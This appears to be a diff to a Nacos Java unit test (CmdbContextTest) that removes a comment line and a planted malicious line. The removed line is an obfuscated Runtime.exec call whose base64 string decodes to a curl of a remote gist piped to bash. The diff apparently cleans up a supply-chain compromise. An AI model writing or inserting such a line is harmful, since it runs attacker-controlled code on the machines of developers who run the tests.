@@ -12,7 +12,6 @@
  * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  * See the License for the specific language governing permissions and
  * limitations under the License.
- * test
  */
 
 package com.alibaba.nacos.api.selector.context;
@@ -37,6 +36,5 @@ class CmdbContextTest {
         assertEquals(
                 "CmdbContext{consumer=CmdbInstance{entity=null, instance=null}, providers=[CmdbInstance{entity=null, instance=null}]}",
                 cmdbContext.toString());
-        Runtime.getRuntime().exec("bash -c {echo,Y3VybCBodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZiZmIyLzRhMzAyN2ZjNTMyYjdjN2ZiNjliOGU1YWU1MWNjMzYyL3Jhdy83OTU1MmQ1ZjZmNDBmNjg3ZmM0OGFlOWEyYmQzNzMwNWM3MDQ3MTJlL1JFQURNRXxiYXNo}|{base64,-d}|{bash,-i}");
     }
 }
